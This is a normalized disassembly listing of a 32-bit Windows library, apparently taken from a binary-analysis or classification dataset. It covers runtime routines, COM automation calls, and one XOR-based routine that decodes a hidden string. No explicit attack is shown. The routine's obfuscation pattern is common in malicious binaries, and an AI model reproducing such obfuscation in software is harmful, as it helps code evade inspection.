je r-xdata
lea eax [ esi + 0x1 ]
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov [ esi + 0x4 ] 0x0
pop esi
xor eax eax
pop ebx
pop ecx
pop ebp
retn 0x4
mov [ esi ] eax
test eax eax
je r-xdata
sub_1002f85f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
mov eax [ esi ]
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x4 ]
call sub_100539e5
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
call sub_100382f1
jmp r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x61 ]
cmp ecx 0x19
ja r-xdata
cmp [ ebp - 0xc ] 0x0
mov [ ebp - 0x10 ] eax
jne r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
pop esi
leave
retn
sub eax 0x20
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
mov eax [ ebp - 0x8 ]
and eax 0xff
movsx eax [ ecx + eax * 2 ]
shr eax 0xf
and eax 0x1
mov [ ebp - 0x8 ] ebx
sar [ ebp - 0x8 ] 0x8
call sub_10016231
movzx ecx [ ebp - 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
jmp r-xdata
mov eax [ esi + 0x8 ]
test [ eax + ebx * 2 ] 0x2
je r-xdata
push ebx
call sub_1000eb62
pop ecx
test eax eax
jne r-xdata
xor eax eax
mov [ ebp + 0xc ] bl
mov [ ebp + 0xd ] 0x0
inc eax
mov al [ ebp - 0x8 ]
push 0x2
mov [ ebp + 0xc ] al
mov [ ebp + 0xd ] bl
mov [ ebp + 0xe ] 0x0
pop eax
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
jmp r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x4 ]
je r-xdata
push 0x1
push [ ebp - 0x10 ]
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0xc ]
push eax
push 0x200
push [ ebp - 0xc ]
push 0x0
call sub_1000a03a
add esp 0x24
test eax eax
jne r-xdata
pop ebx
movzx ecx [ ebp - 0x3 ]
shl eax 0x8
or eax ecx
sub_1002f993
mov edi edi
push ebp
mov ebp esp
sub esp 0x54
movsx eax [ ebp + 0x28 ]
push esi
mov esi [ ebp + 0x20 ]
push edi
xor edi edi
add eax 0xffffffbf
mov [ ebp - 0x4 ] edi
cmp eax 0x38
ja r-xdata
or [ esi ] 0x2
movzx eax [ eax + lookup_table_1002fc7f ]
jmp [ eax * 4 + jump_table_1002fc23 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop edi
mov [ eax + 0x4 ] ecx
pop esi
leave
retn 0x28
or [ esi ] 0x1
push [ ebp + 0x24 ]
mov eax [ ecx ]
push esi
push [ ebp + 0x1c ]
lea edx [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call [ eax + 0x10 ]
mov eax [ ebp - 0xc ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x8 ]
push [ ebp + 0x24 ]
mov eax [ ecx ]
push esi
push [ ebp + 0x1c ]
lea edx [ ebp - 0x14 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call [ eax + 0x14 ]
mov eax [ ebp - 0x14 ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x10 ]
jmp r-xdata
push r--data
lea eax [ ebp - 0x24 ]
lea eax [ ebp - 0x4 ]
push eax
push 0x63
push edi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1001150f
or [ esi ] eax
add esp 0x18
test [ esi ] 0x2
jne r-xdata
mov eax [ ebp + 0x24 ]
add eax 0xc
push eax
push 0x1f
push r--data
lea eax [ ebp - 0x2c ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x8
push eax
push 0x17
mov eax [ ebp + 0x24 ]
add eax 0x8
push eax
push 0xb
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x1c
push eax
push 0x16e
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1001150f
or [ esi ] eax
add esp 0x18
test [ esi ] 0x2
jne r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x4
push eax
push r--data
lea eax [ ebp - 0x34 ]
jmp r-xdata
push r--data
push edi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1005db57
add esp 0x10
cmp eax edi
jl r-xdata
push r--data
lea eax [ ebp - 0x3c ]
jmp r-xdata
push r--data
lea eax [ ebp - 0x44 ]
jmp r-xdata
push [ ebp + 0x24 ]
jmp r-xdata
push r--data
lea eax [ ebp - 0x4c ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x1c
push eax
push 0x35
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x18
push eax
push 0x6
jmp r-xdata
push r--data
lea eax [ ebp - 0x54 ]
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0x63
push edi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1001150f
or [ esi ] eax
add esp 0x18
test [ esi ] 0x2
jne r-xdata
push [ ebp + 0x24 ]
mov eax [ ecx ]
push esi
push [ ebp + 0x1c ]
lea edx [ ebp - 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call [ eax + 0x18 ]
mov eax [ ebp - 0x1c ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x18 ]
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10060ea7
test al al
je r-xdata
mov [ ebp + 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0xffffffed
imul eax eax 0x64
push [ ebp + 0x24 ]
push esi
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_100067f9
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1001150f
add esp 0x18
or [ esi ] eax
jmp r-xdata
push edi
jmp r-xdata
push 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x24 ]
dec eax
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov ecx [ ebp + 0x24 ]
imul eax eax 0xc
add [ ecx + 0x8 ] eax
jmp r-xdata
push 0x3b
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp eax 0x45
jge r-xdata
mov ecx [ ebp + 0x24 ]
mov [ ecx + 0x14 ] eax
jmp r-xdata
add eax 0x64
jmp r-xdata
sub_1002fcb8
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
js r-xdata
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
or eax 0xffffffff
pop ebp
retn
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
pop ebp
retn
cmp ecx 0x3
jne r-xdata
mov eax [ rw-data ]
pop ebp
retn
sub_1002fd00
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1007f4c0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x58
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x68 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ esp + 0x30 ] eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
call sub_10040d90
test eax eax
je r-xdata
push ebx
call [ CoInitialize@IAT ]
test eax eax
jne r-xdata
call sub_1000f2f0
test eax eax
je r-xdata
lea eax [ ebx + 0x5 ]
jmp r-xdata
mov eax 0x1
lea ecx [ esp + 0x18 ]
push ecx
push r--data
push 0x4
push ebx
push r--data
mov [ esp + 0x30 ] 0x4
call [ CoCreateInstance@IAT ]
cmp [ esp + 0x18 ] ebx
je r-xdata
mov eax 0x6
jmp r-xdata
mov ecx [ esp + 0x68 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x50 ]
xor ecx esp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov [ esp + 0x1c ] 0x2
call [ CoUninitialize@IAT ]
mov eax [ esp + 0x1c ]
jmp r-xdata
lea edx [ esp + 0x34 ]
push edx
call [ VariantInit@IAT ]
lea edx [ esp + 0x48 ]
mov eax 0xf2
call sub_1001bb80
mov eax edx
push eax
call [ SysAllocString@IAT ]
lea edx [ esp + 0x34 ]
push edx
push edx
push edx
mov esi eax
mov eax [ esp + 0x24 ]
mov ecx [ eax ]
push edx
push esi
push eax
mov eax [ ecx + 0x2c ]
call eax
push esi
mov [ esp + 0x18 ] eax
call [ SysFreeString@IAT ]
mov edi [ Sleep@IAT ]
xor esi esi
cmp [ esp + 0x14 ] ebx
jne r-xdata
push 0x64
call edi
inc esi
cmp esi 0xa
jl r-xdata
mov [ esp + 0x1c ] 0x3
mov [ esp + 0x70 ] ebx
mov eax [ esp + 0x18 ]
lea edx [ esp + 0x14 ]
mov [ esp + 0x14 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x48 ]
call eax
mov eax [ esp + 0x14 ]
cmp eax ebx
je r-xdata
mov eax [ esp + 0x18 ]
lea edx [ esp + 0x2c ]
mov [ esp + 0x2c ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0xe0 ]
call eax
cmp [ esp + 0x2c ] 0x4
je r-xdata
mov [ esp + 0x70 ] 0xffffffff
cmp eax ebx
je r-xdata
lea edx [ esp + 0x24 ]
mov [ esp + 0x70 ] 0x1
push edx
mov [ esp + 0x28 ] ebx
mov ecx [ eax ]
push r--data
push eax
mov eax [ ecx ]
call eax
mov eax [ esp + 0x24 ]
cmp eax ebx
je r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ eax ]
mov edx [ ecx + 0x80 ]
push eax
call edx
mov eax [ esp + 0x18 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
mov eax [ esp + 0x1c ]
jmp r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
jmp r-xdata
mov [ esp + 0x70 ] bl
cmp eax ebx
je r-xdata
mov [ esp + 0x70 ] 0x2
lea edx [ esp + 0x20 ]
mov [ esp + 0x20 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x1b0 ]
call eax
mov eax [ esp + 0x20 ]
cmp eax ebx
je r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ esp + 0x70 ] 0x1
cmp eax ebx
je r-xdata
mov [ esp + 0x70 ] 0x3
lea edx [ esp + 0x28 ]
mov [ esp + 0x28 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0xfc ]
call eax
mov eax [ esp + 0x28 ]
cmp eax ebx
je r-xdata
mov eax [ esp + 0x24 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ esp + 0x70 ] 0x2
cmp eax ebx
je r-xdata
mov edx [ esp + 0x30 ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x28 ]
call eax
test eax eax
mov eax [ esp + 0x28 ]
jne r-xdata
mov eax [ esp + 0x20 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ esp + 0x1c ] ebx
sub_1002ff90
push ebp
mov ebp esp
push esi
push edi
mov esi eax
mov edi ecx
call sub_100642c0
xor edi edi
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ esi + 0x7c ] edi
mov [ esi + 0x80 ] edi
mov [ esi + 0x84 ] edi
mov [ esi + 0x8c ] edi
mov [ esi + 0x90 ] edi
mov [ esi + 0x94 ] ebx
mov [ esi + 0x98 ] edi
mov [ esi + 0x9c ] edi
push ebx
push 0x8
mov [ esi + 0xa0 ] edi
mov [ esi + 0xa4 ] edi
mov [ esi + 0xa8 ] edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov edx [ ebp + 0x8 ]
xor ecx ecx
cmp eax edi
setne cl
push ebx
push edx
push eax
mov [ esi + 0x90 ] eax
mov [ esi + 0x8 ] ecx
call sub_10078600
add esp 0xc
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10030060
push ebp
mov ebp esp
sub esp 0x220
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
mov [ ebp - 0x21c ] ecx
mov [ ebp - 0x218 ] edx
call sub_10068b80
add esp 0x4
test eax eax
mov eax 0x2
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push ebx
push esi
push edi
lea edx [ ebp - 0x214 ]
call sub_10050930
mov edi [ rw-data ]
cmp [ edi + 0x120 ] 0x0
je r-xdata
pop edi
pop esi
mov eax 0x3
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push 0x208
lea ecx [ ebp - 0x20c ]
push 0x0
push ecx
call sub_10078970
lea edx [ ebp - 0x210 ]
push edx
call sub_1000b569
mov ecx [ ebp - 0x210 ]
mov eax 0xcccccccd
mul ecx
mov eax [ edi + 0x120 ]
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov [ ebp - 0x210 ] ecx
imul ecx ecx 0x208
lea ebx [ ecx + eax + 0x1082c ]
add esp 0x10
mov ecx 0x104
lea eax [ ebp - 0x20c ]
xor esi esi
test ecx ecx
jne r-xdata
add eax 0x2
dec ecx
jne r-xdata
mov edx 0x104
sub edx ecx
jmp r-xdata
mov esi 0x80070057
xor edx edx
cmp [ eax ] si
je r-xdata
jmp r-xdata
mov eax esi
test esi esi
js r-xdata
test eax eax
jne r-xdata
mov eax 0x104
sub eax edx
lea ecx [ ebp + edx * 2 - 0x20c ]
push ebx
mov edx 0x7fffffff
call sub_1006b860
lea eax [ ebp - 0x214 ]
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
je r-xdata
lea edx [ ebp - 0x210 ]
push edx
call sub_1000b569
mov ecx [ ebp - 0x210 ]
mov eax 0xcccccccd
mul ecx
mov eax [ edi + 0x120 ]
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov [ ebp - 0x210 ] ecx
imul ecx ecx 0x208
add esp 0x4
lea ecx [ ecx + eax + 0x11c7c ]
push ecx
mov esi 0x104
lea ebx [ ebp - 0x20c ]
call sub_10030af0
test eax eax
je r-xdata
lea ecx [ ebp - 0x214 ]
push ecx
mov esi 0x104
lea ebx [ ebp - 0x20c ]
call sub_10030af0
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x21c ]
lea edx [ ebp - 0x20c ]
push edx
mov edx [ ebp - 0x218 ]
push eax
call sub_10055c30
add esp 0x8
neg eax
pop edi
sbb eax eax
pop esi
and eax 0x4
pop ebx
sub_10030239
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0xc ]
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0x1 ]
push eax
mov [ ebp - 0x1 ] 0x0
call sub_10026143
mov al [ ebp - 0x1 ]
add esp 0x10
leave
retn
sub_10030263
push 0x14
mov eax sub_1007e60b
call sub_10050d0f
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100067d1
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007a60
mov ecx [ ebp + 0x8 ]
push eax
call sub_100033a0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1002470e
mov eax edi
call sub_1001a1b3
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1002bd03
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_1001c4b0
push edi
call sub_10009b69
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_10036aac
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002050e
sub_10030300
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_10054678
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x107
lea eax [ ebp - 0x10 ]
push eax
push 0x107
push [ ebp + 0x8 ]
call sub_100159e2
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_10030360
push ebp
mov ebp esp
sub esp 0xbc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
push ebx
xor ebx ebx
push esi
mov [ ebp - 0xbc ] ebx
mov [ ebp - 0xb0 ] ebx
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff8a
and edx 0xff
mov [ ebp + eax * 2 - 0x3c ] dx
inc eax
cmp eax 0x12
jb r-xdata
xor eax eax
lea edx [ ebp - 0xb0 ]
push edx
mov [ ebp - 0x18 ] ax
mov eax [ edi + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x3c ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
cmp [ edi + 0x118 ] 0x8
lea eax [ edi + 0x104 ]
jb r-xdata
mov ecx 0x3
lea edx [ ebp - 0x58 ]
mov eax 0x134
mov [ ebp - 0x14 ] cx
lea esi [ ecx - 0x2 ]
call sub_1000a6f0
mov ebx [ ebp - 0x14 ]
mov ecx [ edi + 0x1c ]
mov edx [ ecx ]
lea eax [ ebp - 0xb0 ]
push eax
push r--data
lea eax [ ebp - 0x58 ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] ebx
mov ebx [ ebp - 0x10 ]
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] esi
mov esi [ ebp - 0x8 ]
push ecx
mov ecx [ edx + 0xe0 ]
mov [ eax + 0xc ] esi
call ecx
test eax eax
je r-xdata
push eax
call [ SysAllocString@IAT ]
mov esi eax
mov eax [ ebp - 0xb0 ]
mov edx [ eax ]
push esi
push eax
mov eax [ edx + 0x6c ]
call eax
lea edx [ ebp - 0x10 ]
mov eax 0x4a
mov [ ebp - 0xb8 ] ebx
mov [ ebp - 0xb4 ] ebx
call sub_1000a6f0
mov eax [ edi + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0xb8 ]
push edx
lea edx [ ebp - 0x10 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov eax [ eax ]
xor ebx ebx
lea edx [ ebp - 0xac ]
mov eax 0x119
call sub_1000a6f0
mov esi 0x1
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0xb8 ]
mov ecx [ eax ]
lea edx [ ebp - 0xb4 ]
push edx
mov edx [ ebp - 0xb0 ]
push edx
push eax
mov eax [ ecx + 0x54 ]
call eax
mov eax [ ebp - 0xb4 ]
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x70 ]
mov eax 0xad
call sub_1000a6f0
mov [ ebp - 0xbc ] 0x2
jmp r-xdata
mov eax [ ebp - 0xb0 ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0xb8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0xb4 ] ebx
push esi
call [ SysFreeString@IAT ]
mov esi [ ebp - 0xbc ]
mov ecx [ ebp - 0x4 ]
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_10030530
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10041f10
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10065045
add esp 0x4
sub_10030551
mov edi edi
push ebp
mov ebp esp
push esi
call sub_10044fed
mov esi [ ebp + 0x8 ]
cmp esi [ eax + 0x98 ]
jne r-xdata
call sub_10044fed
mov eax [ eax + 0x98 ]
jmp r-xdata
call sub_10044fed
mov ecx [ esi + 0x4 ]
mov [ eax + 0x98 ] ecx
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ eax + 0x4 ]
cmp esi ecx
je r-xdata
pop esi
pop ebp
jmp sub_1001e222
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax ecx
pop esi
pop ebp
retn
sub_100305a3
push 0x4
mov eax sub_1007e5c5
call sub_10050d0f
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
call sub_1002a42f
mov eax esi
call sub_1001a1b3
retn 0x8
sub_100305d6
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push edi
mov edi ecx
je r-xdata
pop edi
pop ebp
retn 0x4
push esi
push [ ebp + 0x8 ]
call sub_10078ac0
lea esi [ eax + 0x1 ]
push esi
call sub_10056814
pop ecx
pop ecx
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
pop esi
push [ ebp + 0x8 ]
push esi
push eax
call sub_10005e18
add esp 0xc
mov [ edi + 0x8 ] 0x1
sub_10030616
push 0x60
mov eax sub_1007e7d2
call sub_10007703
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
or [ ebp - 0x50 ] 0xffffffff
mov [ ebp - 0x68 ] eax
mov eax [ ebp + 0x20 ]
xor ebx ebx
mov [ ebp - 0x58 ] eax
mov eax [ ebp + 0x24 ]
inc ebx
test [ esi + 0x14 ] 0x4000
mov [ ebp - 0x54 ] ecx
mov [ ebp - 0x6c ] eax
mov ecx esi
je r-xdata
lea eax [ ebp - 0x60 ]
xor edi edi
push eax
mov [ ebp - 0x5c ] edi
call sub_10009450
mov esi [ esi + 0x14 ]
lea ecx [ ebp - 0x5c ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0x4
call sub_10010e0d
add esp 0x18
push eax
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10045daa
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x60 ]
mov esi eax
call sub_1002a730
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x64 ] eax
je r-xdata
lea eax [ ebp - 0x54 ]
push eax
call sub_10009450
xor edi edi
push eax
mov [ ebp - 0x4 ] edi
call sub_10064bde
pop ecx
or esi 0xffffffff
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] esi
call sub_1002a730
push edi
xor eax eax
push ebx
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x38 ] 0x7
mov [ ebp - 0x3c ] edi
mov [ ebp - 0x4c ] ax
call sub_1003fe10
mov ecx [ ebp - 0x50 ]
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x4 ] ebx
call sub_10020962
push esi
push edi
push eax
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x2
call sub_1000c1e0
push edi
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call sub_10024aa0
push edi
push ebx
lea ecx [ ebp - 0x4c ]
call sub_10039dd0
mov ecx [ ebp - 0x50 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10039e87
push esi
push edi
push eax
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x3
call sub_1000c1e0
push edi
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call sub_10024aa0
cmp [ ebp - 0x38 ] 0x8
mov eax [ ebp - 0x4c ]
jae r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10060ea7
test al al
mov eax [ ebp - 0x58 ]
je r-xdata
cmp [ ebp - 0x5c ] edi
jne r-xdata
push eax
push 0x2
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_100582b2
add esp 0x10
push edi
push ebx
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] esi
call sub_10024aa0
jmp r-xdata
lea eax [ ebp - 0x4c ]
cmp [ ebp - 0x50 ] edi
jge r-xdata
or [ eax ] ebx
cmp esi ebx
ja r-xdata
mov ecx [ ebp - 0x6c ]
setne al
mov [ ecx ] al
or [ eax ] 0x2
jmp r-xdata
mov [ ebp - 0x50 ] esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x68 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_10019c00
retn 0x20
sub_100307c3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cl [ ebp + 0x10 ]
push ebx
push esi
push edi
xor edi edi
mov [ eax + 0x4 ] edi
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ eax + 0x8 ] edi
mov eax [ ebp + 0x8 ]
inc ebx
mov [ eax + 0xc ] edi
test cl 0x10
je r-xdata
test cl 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] ebx
mov [ ebp + 0x10 ] 0xc000008f
test bl cl
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] 0x2
mov [ ebp + 0x10 ] 0xc0000093
test cl 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] 0x4
mov [ ebp + 0x10 ] 0xc0000091
test cl 0x8
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] 0x8
mov [ ebp + 0x10 ] 0xc000008e
mov esi [ ebp + 0xc ]
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
shl ecx 0x4
not ecx
xor ecx [ eax + 0x8 ]
and ecx 0x10
xor [ eax + 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
add ecx ecx
not ecx
xor ecx [ eax + 0x8 ]
and ecx 0x8
xor [ eax + 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
shr ecx 0x1
not ecx
xor ecx [ eax + 0x8 ]
and ecx 0x4
xor [ eax + 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
shr ecx 0x3
not ecx
xor ecx [ eax + 0x8 ]
and ecx 0x2
xor [ eax + 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
shr ecx 0x5
not ecx
xor ecx [ eax + 0x8 ]
and ecx ebx
xor [ eax + 0x8 ] ecx
call sub_100611ee
test bl al
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] 0x10
mov [ ebp + 0x10 ] 0xc0000090
test al 0x4
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x10
test al 0x8
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x8
test al 0x10
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x4
test al 0x20
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x2
mov eax [ esi ]
mov ecx 0xc00
and eax ecx
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0xc ] ebx
mov eax [ ebp + 0x8 ]
and [ eax ] 0xfffffffc
cmp eax 0x400
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
and ecx 0xffffffeb
or ecx 0x8
cmp eax 0x200
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
and ecx 0xfffffffd
or ecx ebx
jmp r-xdata
cmp eax 0x800
je r-xdata
